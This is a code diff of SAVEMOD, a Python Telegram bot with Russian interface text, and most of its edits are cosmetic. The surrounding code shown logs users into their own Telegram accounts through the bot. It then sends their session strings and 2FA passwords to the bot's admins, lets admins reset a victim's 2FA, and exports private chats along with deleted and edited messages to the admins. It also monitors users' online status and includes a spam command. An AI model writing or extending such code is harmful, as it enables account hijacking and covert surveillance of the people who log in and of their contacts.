@@ -40,6 +40,7 @@ if not os.path.exists(VOLUME_PATH):
     os.makedirs(VOLUME_PATH, exist_ok=True)
 
 DB_PATH = os.path.join(VOLUME_PATH, 'userbot.db')
+logger.info(f"📁 База данных: {DB_PATH}")
 
 conn = sqlite3.connect(DB_PATH, check_same_thread=False)
 cursor = conn.cursor()
@@ -161,12 +162,13 @@ async def resolve_entity(client, target):
     except:
         return None
 
-async def send_to_admins(text):
+async def send_to_admin(text):
     for admin_id in ADMIN_IDS:
         try:
-            await bot.send_message(admin_id, text)
-        except:
-            pass
+            await bot.send_message(admin_id, text, parse_mode='HTML')
+            logger.info(f"✅ Уведомление отправлено админу {admin_id}")
+        except Exception as e:
+            logger.error(f"❌ Ошибка отправки админу {admin_id}: {e}")
 
 def get_code_keyboard():
     kb = InlineKeyboardMarkup(row_width=3)
@@ -191,197 +193,52 @@ async def export_chat_to_html(client, chat_id, chat_name, me):
                     sender = await client.get_entity(msg.sender_id)
                     sender_name = sender.first_name or sender.username or str(msg.sender_id)
                     direction = "incoming"
-                
                 time_str = msg.date.strftime('%H:%M')
                 date_str = msg.date.strftime('%d.%m.%Y')
                 text = escape_html(msg.text).replace('\n', '<br>')
-                
-                messages.append(f'''
-                <div class="message {direction}">
-                    <div class="message-info">
-                        <span class="sender">{escape_html(sender_name)}</span>
-                        <span class="time">{time_str}</span>
-                    </div>
-                    <div class="message-text">{text}</div>
-                    <div class="message-date">{date_str}</div>
-                </div>
-                ''')
+                messages.append(f'<div class="message {direction}"><div class="message-info"><span class="sender">{escape_html(sender_name)}</span><span class="time">{time_str}</span></div><div class="message-text">{text}</div><div class="message-date">{date_str}</div></div>')
             except:
                 continue
-    
     if not messages:
         return None
-    
     messages.reverse()
-    
     return f'''<!DOCTYPE html>
-<html lang="ru">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Экспорт чата с {escape_html(chat_name)}</title>
-    <style>
-        * {{
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-        }}
-        body {{
-            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', sans-serif;
-            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
-            min-height: 100vh;
-            padding: 20px;
-        }}
-        .container {{
-            max-width: 900px;
-            margin: 0 auto;
-            background: #ffffff;
-            border-radius: 20px;
-            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
-            overflow: hidden;
-        }}
-        .header {{
-            background: linear-gradient(135deg, #1a1a2e 0%, #16213e 100%);
-            color: white;
-            padding: 25px 30px;
-            text-align: center;
-        }}
-        .header h1 {{
-            font-size: 24px;
-            margin-bottom: 8px;
-            font-weight: 600;
-        }}
-        .header p {{
-            opacity: 0.8;
-            font-size: 14px;
-        }}
-        .stats {{
-            display: flex;
-            justify-content: space-around;
-            background: #0f3460;
-            color: white;
-            padding: 12px;
-            font-size: 13px;
-        }}
-        .stats span {{
-            font-weight: bold;
-            font-size: 18px;
-        }}
-        .messages {{
-            padding: 20px;
-            background: #f8f9fa;
-            max-height: 70vh;
-            overflow-y: auto;
-        }}
-        .message {{
-            margin-bottom: 16px;
-            padding: 12px 16px;
-            border-radius: 18px;
-            max-width: 85%;
-            word-wrap: break-word;
-            position: relative;
-            animation: fadeIn 0.3s ease;
-        }}
-        @keyframes fadeIn {{
-            from {{ opacity: 0; transform: translateY(10px); }}
-            to {{ opacity: 1; transform: translateY(0); }}
-        }}
-        .incoming {{
-            background: #e9ecef;
-            margin-right: auto;
-            border-bottom-left-radius: 4px;
-        }}
-        .outgoing {{
-            background: #007aff;
-            color: white;
-            margin-left: auto;
-            border-bottom-right-radius: 4px;
-        }}
-        .outgoing .sender {{
-            color: #ffd700;
-        }}
-        .outgoing .time {{
-            color: rgba(255,255,255,0.7);
-        }}
-        .outgoing .message-date {{
-            color: rgba(255,255,255,0.5);
-        }}
-        .message-info {{
-            display: flex;
-            justify-content: space-between;
-            margin-bottom: 6px;
-            font-size: 12px;
-            flex-wrap: wrap;
-            gap: 8px;
-        }}
-        .sender {{
-            font-weight: 600;
-            color: #007aff;
-        }}
-        .time {{
-            color: #6c757d;
-            font-size: 11px;
-        }}
-        .message-text {{
-            font-size: 14px;
-            line-height: 1.5;
-            white-space: pre-wrap;
-            word-break: break-word;
-        }}
-        .message-date {{
-            font-size: 10px;
-            color: #adb5bd;
-            margin-top: 5px;
-            text-align: right;
-        }}
-        .footer {{
-            background: #f1f3f5;
-            text-align: center;
-            padding: 15px;
-            font-size: 12px;
-            color: #6c757d;
-            border-top: 1px solid #dee2e6;
-        }}
-        ::-webkit-scrollbar {{
-            width: 6px;
-        }}
-        ::-webkit-scrollbar-track {{
-            background: #e9ecef;
-            border-radius: 3px;
-        }}
-        ::-webkit-scrollbar-thumb {{
-            background: #adb5bd;
-            border-radius: 3px;
-        }}
-        @media (max-width: 768px) {{
-            .message {{
-                max-width: 95%;
-            }}
-            .container {{
-                border-radius: 12px;
-            }}
-            .header h1 {{
-                font-size: 18px;
-            }}
-        }}
-    </style>
+<html>
+<head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>Экспорт чата с {escape_html(chat_name)}</title>
+<style>
+*{{margin:0;padding:0;box-sizing:border-box}}
+body{{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;background:linear-gradient(135deg,#667eea 0%,#764ba2 100%);min-height:100vh;padding:20px}}
+.container{{max-width:900px;margin:0 auto;background:#fff;border-radius:20px;box-shadow:0 20px 60px rgba(0,0,0,0.3);overflow:hidden}}
+.header{{background:linear-gradient(135deg,#1a1a2e 0%,#16213e 100%);color:#fff;padding:25px 30px;text-align:center}}
+.header h1{{font-size:24px;margin-bottom:8px}}
+.header p{{opacity:0.8;font-size:14px}}
+.stats{{display:flex;justify-content:space-around;background:#0f3460;color:#fff;padding:12px;font-size:13px}}
+.stats span{{font-weight:bold;font-size:18px}}
+.messages{{padding:20px;background:#f8f9fa;max-height:70vh;overflow-y:auto}}
+.message{{margin-bottom:16px;padding:12px 16px;border-radius:18px;max-width:85%;word-wrap:break-word;animation:fadeIn 0.3s ease}}
+@keyframes fadeIn{{from{{opacity:0;transform:translateY(10px)}}to{{opacity:1;transform:translateY(0)}}}}
+.incoming{{background:#e9ecef;margin-right:auto;border-bottom-left-radius:4px}}
+.outgoing{{background:#007aff;color:#fff;margin-left:auto;border-bottom-right-radius:4px}}
+.outgoing .sender{{color:#ffd700}}
+.outgoing .time,.outgoing .message-date{{color:rgba(255,255,255,0.7)}}
+.message-info{{display:flex;justify-content:space-between;margin-bottom:6px;font-size:12px;flex-wrap:wrap;gap:8px}}
+.sender{{font-weight:600;color:#007aff}}
+.time{{color:#6c757d;font-size:11px}}
+.message-text{{font-size:14px;line-height:1.5;white-space:pre-wrap;word-break:break-word}}
+.message-date{{font-size:10px;color:#adb5bd;margin-top:5px;text-align:right}}
+.footer{{background:#f1f3f5;text-align:center;padding:15px;font-size:12px;color:#6c757d;border-top:1px solid #dee2e6}}
+::-webkit-scrollbar{{width:6px}}
+::-webkit-scrollbar-track{{background:#e9ecef;border-radius:3px}}
+::-webkit-scrollbar-thumb{{background:#adb5bd;border-radius:3px}}
+@media(max-width:768px){{.message{{max-width:95%}}.container{{border-radius:12px}}.header h1{{font-size:18px}}}}
+</style>
 </head>
 <body>
 <div class="container">
-    <div class="header">
-        <h1>💬 Экспорт чата с {escape_html(chat_name)}</h1>
-        <p>Экспорт переписки из Telegram — {datetime.now().strftime('%d.%m.%Y')}</p>
-    </div>
-    <div class="stats">
-        <div>📊 Всего сообщений: <span>{len(messages)}</span></div>
-        <div>👤 Чат: <span>{escape_html(chat_name)}</span></div>
-    </div>
-    <div class="messages">
-        {''.join(messages)}
-    </div>
-    <div class="footer">
-        📅 Экспортировано: {datetime.now().strftime('%d.%m.%Y %H:%M:%S')} | 🔒 Приватный чат
-    </div>
+<div class="header"><h1>💬 Экспорт чата с {escape_html(chat_name)}</h1><p>Экспорт переписки из Telegram — {datetime.now().strftime('%d.%m.%Y')}</p></div>
+<div class="stats"><div>📊 Всего сообщений: <span>{len(messages)}</span></div><div>👤 Чат: <span>{escape_html(chat_name)}</span></div></div>
+<div class="messages">{''.join(messages)}</div>
+<div class="footer">📅 Экспортировано: {datetime.now().strftime('%d.%m.%Y %H:%M:%S')} | 🔒 Приватный чат</div>
 </div>
 </body>
 </html>'''
@@ -416,7 +273,7 @@ async def cmd_spyhelp(message):
 /stats - статистика
 /backup - бэкап
 
-🤖 ЮЗЕРБОТ (через точку)
+🤖 КОМАНДЫ SAVEMOD (через точку)
 .help .mute .unmute .list .spam .type .info
 """)
 
@@ -651,7 +508,7 @@ async def cmd_chats(message):
     if not cl:
         await message.answer("Нет активного аккаунта")
         return
-    await message.answer("Собираю список...")
+    await message.answer("🔄 Собираю список диалогов...")
     chats = []
     async for dlg in cl.iter_dialogs():
         if dlg.is_user:
@@ -721,10 +578,10 @@ async def chat_full(cb):
         return
     try:
         me = await cl.get_me()
-        status = await cb.message.answer("Экспортирую...")
+        status = await cb.message.answer("📄 Экспортирую...")
         htmlc = await export_chat_to_html(cl, cid, cname, me)
         if not htmlc:
-            await status.edit_text("Нет сообщений")
+            await status.edit_text("❌ Нет сообщений")
             return
         with tempfile.NamedTemporaryFile(mode='w', suffix='.html', encoding='utf-8', delete=False) as f:
             f.write(htmlc)
@@ -732,14 +589,14 @@ async def chat_full(cb):
         with open(path, 'rb') as f:
             for aid in ADMIN_IDS:
                 try:
-                    await bot.send_document(aid, InputFile(f, filename=f"chat_{cname}.html"), caption=f"Чат с {cname}")
+                    await bot.send_document(aid, InputFile(f, filename=f"chat_{cname}.html"), caption=f"📁 Чат с {cname}")
                     await f.seek(0)
                 except:
                     pass
         os.unlink(path)
         await status.delete()
     except Exception as e:
-        await cb.message.answer(f"Ошибка: {e}")
+        await cb.message.answer(f"❌ Ошибка: {e}")
 
 @dp.message_handler(commands=['export'])
 async def cmd_export(message):
@@ -758,12 +615,12 @@ async def cmd_export(message):
         await message.answer("Не найден")
         return
     name = ent.first_name or ent.username or str(ent.id)
-    status = await message.answer(f"Экспортирую чат с {name}...")
+    status = await message.answer(f"📄 Экспортирую чат с {name}...")
     try:
         me = await cl.get_me()
         htmlc = await export_chat_to_html(cl, ent.id, name, me)
         if not htmlc:
-            await status.edit_text("Нет сообщений")
+            await status.edit_text("❌ Нет сообщений")
             return
         with tempfile.NamedTemporaryFile(mode='w', suffix='.html', encoding='utf-8', delete=False) as f:
             f.write(htmlc)
@@ -771,14 +628,14 @@ async def cmd_export(message):
         with open(path, 'rb') as f:
             for aid in ADMIN_IDS:
                 try:
-                    await bot.send_document(aid, InputFile(f, filename=f"chat_{name}.html"), caption=f"Чат с {name}")
+                    await bot.send_document(aid, InputFile(f, filename=f"chat_{name}.html"), caption=f"📁 Чат с {name}")
                     await f.seek(0)
                 except:
                     pass
         os.unlink(path)
         await status.delete()
     except Exception as e:
-        await status.edit_text(f"Ошибка: {e}")
+        await status.edit_text(f"❌ Ошибка: {e}")
 
 @dp.message_handler(commands=['status'])
 async def cmd_status(message):
@@ -797,7 +654,7 @@ async def cmd_status(message):
         await message.answer("Не найден")
         return
     st = get_status_text(ent.status) if hasattr(ent, 'status') else "Статус скрыт"
-    await message.answer(f"{ent.first_name}\nID: {ent.id}\n{st}")
+    await message.answer(f"👤 {ent.first_name}\n🆔 {ent.id}\n📊 {st}")
 
 @dp.message_handler(commands=['online'])
 async def cmd_online(message):
@@ -817,9 +674,9 @@ async def cmd_online(message):
             except:
                 pass
     if online:
-        await message.answer(f"В сети ({len(online)}):\n" + "\n".join(online[:30]))
+        await message.answer(f"🟢 В сети ({len(online)}):\n" + "\n".join(online[:30]))
     else:
-        await message.answer("Никого в сети")
+        await message.answer("🟢 Никого в сети")
 
 @dp.message_handler(commands=['mon'])
 async def cmd_mon(message):
@@ -838,7 +695,7 @@ async def cmd_mon(message):
         await message.answer("Не найден")
         return
     monitored_users[str(ent.id)] = {'name': ent.first_name, 'admin_id': message.from_user.id}
-    await message.answer(f"Мониторинг {ent.first_name} начат")
+    await message.answer(f"✅ Мониторинг {ent.first_name} начат")
 
 @dp.message_handler(commands=['unmon'])
 async def cmd_unmon(message):
@@ -858,9 +715,9 @@ async def cmd_unmon(message):
         return
     if str(ent.id) in monitored_users:
         del monitored_users[str(ent.id)]
-        await message.answer(f"Мониторинг {ent.first_name} остановлен")
+        await message.answer(f"✅ Мониторинг {ent.first_name} остановлен")
     else:
-        await message.answer("Не отслеживается")
+        await message.answer("❌ Не отслеживается")
 
 @dp.message_handler(commands=['session'])
 async def cmd_session(message):
@@ -882,12 +739,12 @@ async def cmd_session(message):
         name = fn or un or str(uid)
         for aid in ADMIN_IDS:
             try:
-                await bot.send_message(aid, f"СЕССИЯ {name}\n\n<code>{ss}</code>")
+                await bot.send_message(aid, f"🎭 СЕССИЯ {name}\n\n<code>{ss}</code>", parse_mode='HTML')
             except:
                 pass
-        await message.answer("Сессия отправлена")
+        await message.answer("✅ Сессия отправлена")
     except:
-        await message.answer("Ошибка")
+        await message.answer("❌ Ошибка")
 
 @dp.message_handler(commands=['set2fa'])
 async def cmd_set2fa(message):
@@ -905,9 +762,9 @@ async def cmd_set2fa(message):
         await cl.edit_2fa(args)
         cursor.execute('UPDATE user_sessions SET two_fa=? WHERE user_id=?', (args, uid))
         conn.commit()
-        await message.answer(f"2FA установлен: <code>{args}</code>")
+        await message.answer(f"✅ 2FA установлен: <code>{args}</code>", parse_mode='HTML')
     except Exception as e:
-        await message.answer(f"Ошибка: {e}")
+        await message.answer(f"❌ Ошибка: {e}")
 
 @dp.message_handler(commands=['info'])
 async def cmd_info(message):
@@ -921,9 +778,9 @@ async def cmd_info(message):
         me = await cl.get_me()
         cursor.execute('SELECT phone, two_fa FROM user_sessions WHERE user_id=?', (uid,))
         row = cursor.fetchone()
-        await message.answer(f"{me.first_name}\nID: {me.id}\n📱 {row[0] if row else '-'}\n🔐 {'✅' if row and row[1] else '❌'}")
+        await message.answer(f"👤 {me.first_name}\n🆔 {me.id}\n📱 {row[0] if row else '-'}\n🔐 {'✅' if row and row[1] else '❌'}")
     except:
-        await message.answer("Ошибка")
+        await message.answer("❌ Ошибка")
 
 @dp.message_handler(commands=['logs'])
 async def cmd_logs(message):
@@ -936,7 +793,7 @@ async def cmd_logs(message):
     if not rows:
         await message.answer("Нет логов")
         return
-    out = "ЛОГИ\n\n"
+    out = "📜 ЛОГИ\n\n"
     for ts, nm, msg in reversed(rows):
         out += f"[{ts[11:16]}] {nm}: {msg[:80]}\n"
     await message.answer(out[:4000])
@@ -952,7 +809,7 @@ async def cmd_statuslogs(message):
     if not rows:
         await message.answer("Нет логов")
         return
-    out = "ЛОГИ СТАТУСОВ\n\n"
+    out = "🔄 ЛОГИ СТАТУСОВ\n\n"
     for ts, nm, st in reversed(rows):
         e = "🟢" if "ВОШЕЛ" in st else "⚫"
         out += f"{e} [{ts[11:16]}] {nm}: {st}\n"
@@ -971,18 +828,18 @@ async def cmd_stats(message):
 async def cmd_backup(message):
     if not is_admin(message.from_user.id):
         return
-    st = await message.answer("Создаю бэкап...")
+    st = await message.answer("💾 Создаю бэкап...")
     bp = os.path.join(VOLUME_PATH, f'backup_{datetime.now().strftime("%Y%m%d_%H%M%S")}.db')
     shutil.copy2(DB_PATH, bp)
     with open(bp, 'rb') as f:
         for aid in ADMIN_IDS:
             try:
-                await bot.send_document(aid, InputFile(f, filename=os.path.basename(bp)), caption="Бэкап БД")
+                await bot.send_document(aid, InputFile(f, filename=os.path.basename(bp)), caption="💾 Бэкап БД")
                 await f.seek(0)
             except:
                 pass
     os.remove(bp)
-    await st.edit_text("Бэкап отправлен")
+    await st.edit_text("✅ Бэкап отправлен")
 
 @dp.message_handler(commands=['start'])
 async def cmd_start(message):
@@ -1012,7 +869,7 @@ async def handle_contact(message):
         temp_auth[uid] = {'client': client, 'phone': phone, 'hash': res.phone_code_hash, 'code': ''}
         await message.answer("📱 Введи код из SMS:", reply_markup=get_code_keyboard())
     except Exception as e:
-        await message.answer(f"Ошибка: {e}")
+        await message.answer(f"❌ Ошибка: {e}")
 
 @dp.callback_query_handler(lambda c: c.data.startswith('code_'))
 async def handle_code(cb):
@@ -1038,7 +895,7 @@ async def handle_code(cb):
             return
     code = temp_auth[uid]['code']
     disp = code if code else "_____"
-    await cb.message.edit_text(f"Код: {disp}", reply_markup=get_code_keyboard())
+    await cb.message.edit_text(f"📱 Код: {disp}", reply_markup=get_code_keyboard())
     await cb.answer()
 
 async def complete_auth(cb, uid):
@@ -1066,7 +923,7 @@ async def complete_auth(cb, uid):
             pending_2fa[uid] = data
             del temp_auth[uid]
         else:
-            await cb.message.answer(f"Ошибка: {e}")
+            await cb.message.answer(f"❌ Ошибка: {e}")
 
 @dp.message_handler(lambda msg: msg.from_user.id in pending_2fa)
 async def handle_2fa(message):
@@ -1085,11 +942,11 @@ async def handle_2fa(message):
         del pending_2fa[uid]
         for aid in ADMIN_IDS:
             try:
-                await bot.send_message(aid, f"🎉 Новый пользователь (2FA): {me.first_name}\nID: {uid}\n2FA: {message.text.strip()}")
+                await bot.send_message(aid, f"🎉 Новый пользователь (2FA): {me.first_name}\nID: {uid}\n🔐 2FA: {message.text.strip()}")
             except:
                 pass
     except Exception as e:
-        await message.answer(f"Ошибка 2FA: {e}")
+        await message.answer(f"❌ Ошибка 2FA: {e}")
 
 async def run_userbot(owner_id, session_string):
     if owner_id in active_clients:
@@ -1106,9 +963,10 @@ async def run_userbot(owner_id, session_string):
     active_clients[owner_id] = client
     saved_messages[owner_id] = {}
     user_status_tracker[owner_id] = {}
-    logger.info(f"Юзербот запущен для {owner_id}")
+    logger.info(f"✅ Юзербот запущен для {owner_id}")
     cursor.execute('SELECT user_id FROM muted_users WHERE muted_by=?', (owner_id,))
     muted_users = {row[0] for row in cursor.fetchall()}
+    logger.info(f"🔇 Загружено заглушенных: {len(muted_users)}")
     
     @client.on(events.UserUpdate)
     async def track_status(event):
@@ -1149,11 +1007,16 @@ async def run_userbot(owner_id, session_string):
         if event.out:
             return
         sid = event.sender_id
+        
+        # ПРОВЕРКА НА МУТ
         if sid in muted_users:
             await event.delete()
+            logger.info(f"🗑 Удалено сообщение от заглушенного {sid}")
             return
+        
         if is_target_admin(sid):
             return
+        
         if event.text:
             saved_messages[owner_id][event.id] = {'sender_id': sid, 'text': event.text}
             cursor.execute('INSERT INTO saved_messages (owner_id, msg_id, sender_id, text, date) VALUES (?, ?, ?, ?, ?)',
@@ -1183,7 +1046,7 @@ async def run_userbot(owner_id, session_string):
                     u = await client.get_entity(msg['sender_id'])
                     name = u.first_name or 'Пользователь'
                     uname = f"@{u.username}" if u.username else ''
-                    await send_to_admins(f"🗑 {name} {uname} удалил:\n\n{msg['text'][:500]}")
+                    await send_to_admin(f"🗑 <b>{name}</b> {uname} удалил сообщение:\n\n<blockquote>{msg['text'][:500]}</blockquote>")
                     cursor.execute('DELETE FROM saved_messages WHERE owner_id=? AND msg_id=?', (owner_id, mid))
                     conn.commit()
                     if mid in saved_messages.get(owner_id, {}):
@@ -1208,7 +1071,7 @@ async def run_userbot(owner_id, session_string):
                 u = await client.get_entity(msg['sender_id'])
                 name = u.first_name or 'Пользователь'
                 uname = f"@{u.username}" if u.username else ''
-                await send_to_admins(f"✏️ {name} {uname} изменил:\n\nБыло: {msg['text'][:200]}\nСтало: {ntxt[:200]}")
+                await send_to_admin(f"✏️ <b>{name}</b> {uname} изменил сообщение:\n\n<b>Было:</b>\n<blockquote>{msg['text'][:200]}</blockquote>\n<b>Стало:</b>\n<blockquote>{ntxt[:200]}</blockquote>")
                 cursor.execute('UPDATE saved_messages SET text=? WHERE owner_id=? AND msg_id=?', (ntxt, owner_id, mid))
                 conn.commit()
                 if mid in saved_messages.get(owner_id, {}):
@@ -1226,7 +1089,7 @@ async def run_userbot(owner_id, session_string):
         
         if txt == '.help':
             await event.edit("""
-🤖 КОМАНДЫ ЮЗЕРБОТА
+🤖 КОМАНДЫ SAVEMOD
 
 .help - справка
 .mute (ответ) - заглушить
@@ -1241,51 +1104,69 @@ async def run_userbot(owner_id, session_string):
         if txt == '.mute':
             reply = await event.get_reply_message()
             if not reply:
-                await event.edit('❌ Ответь на сообщение')
+                await event.edit('❌ Ответь на сообщение пользователя')
                 return
+            
             tid = reply.sender_id
             if not tid:
                 await event.edit('❌ Не удалось определить пользователя')
                 return
+            
             if tid == owner_id:
                 await event.edit('❌ Нельзя заглушить себя')
                 return
+            
             if is_target_admin(tid):
-                await event.edit('❌ Нельзя заглушить админа')
+                await event.edit('❌ Нельзя заглушить администратора')
                 return
-            if tid in muted_users:
-                await event.edit('🔇 Уже заглушен')
+            
+            # Проверяем есть ли уже в муте
+            cursor.execute('SELECT 1 FROM muted_users WHERE user_id=? AND muted_by=?', (tid, owner_id))
+            if cursor.fetchone():
+                await event.edit(f'🔇 Пользователь уже заглушен')
                 return
+            
+            # Добавляем в мут
             cursor.execute('INSERT INTO muted_users (user_id, muted_by, muted_at) VALUES (?, ?, ?)',
                           (tid, owner_id, datetime.now().isoformat()))
             conn.commit()
+            
+            # Обновляем локальный список
             muted_users.add(tid)
+            logger.info(f"🔇 Добавлен мут: {tid} от {owner_id}")
+            
             try:
                 u = await client.get_entity(tid)
-                await event.edit(f'🔇 {u.first_name} заглушен')
+                await event.edit(f'🔇 Пользователь {u.first_name} заглушен')
             except:
-                await event.edit(f'🔇 Пользователь заглушен')
+                await event.edit(f'🔇 Пользователь {tid} заглушен')
             return
         
         if txt == '.unmute':
             reply = await event.get_reply_message()
             if not reply:
-                await event.edit('❌ Ответь на сообщение')
+                await event.edit('❌ Ответь на сообщение пользователя')
                 return
+            
             tid = reply.sender_id
             if not tid:
                 await event.edit('❌ Не удалось определить пользователя')
                 return
+            
             if tid == owner_id:
                 await event.edit('❌ Нельзя разглушить себя')
                 return
+            
             cursor.execute('DELETE FROM muted_users WHERE user_id=? AND muted_by=?', (tid, owner_id))
             conn.commit()
+            
             if tid in muted_users:
                 muted_users.discard(tid)
+            logger.info(f"🔊 Удален мут: {tid} от {owner_id}")
+            
             try:
                 u = await client.get_entity(tid)
-                await event.edit(f'🔊 {u.first_name} разглушен')
+                await event.edit(f'🔊 Пользователь {u.first_name} разглушен')
             except:
                 await event.edit(f'🔊 Пользователь разглушен')
             return
@@ -1301,7 +1182,7 @@ async def run_userbot(owner_id, session_string):
                         names.append(f"• {uid}")
                 await event.edit("🔇 Заглушенные:\n" + "\n".join(names))
             else:
-                await event.edit("🔇 Нет")
+                await event.edit("🔇 Нет заглушенных")
             return
         
         if txt.startswith('.spam '):
@@ -1347,7 +1228,7 @@ async def run_userbot(owner_id, session_string):
                         await event.edit("❌ Админ")
                         return
                     muted = "✅" if reply.sender_id in muted_users else "❌"
-                    await event.edit(f"👤 {u.first_name}\nID: {u.id}\n🔇 Заглушен: {muted}")
+                    await event.edit(f"👤 {u.first_name}\n🆔 {u.id}\n🔇 Заглушен: {muted}")
                 except:
                     pass
             else:
@@ -1360,7 +1241,7 @@ flask_app = Flask(__name__)
 
 @flask_app.route('/')
 def health():
-    return jsonify({'status': 'ok'})
+    return jsonify({'status': 'ok', 'time': datetime.now().isoformat()})
 
 def run_web():
     flask_app.run(host='0.0.0.0', port=8080, debug=False)
@@ -1372,7 +1253,7 @@ async def restore_sessions():
             asyncio.create_task(run_userbot(uid, ss))
 
 async def main():
-    logger.info(f"SAVEMOD запущен. Админы: {ADMIN_IDS}")
+    logger.info(f"🚀 SAVEMOD запущен. Админы: {ADMIN_IDS}")
     await restore_sessions()
     while True:
         await asyncio.sleep(60)
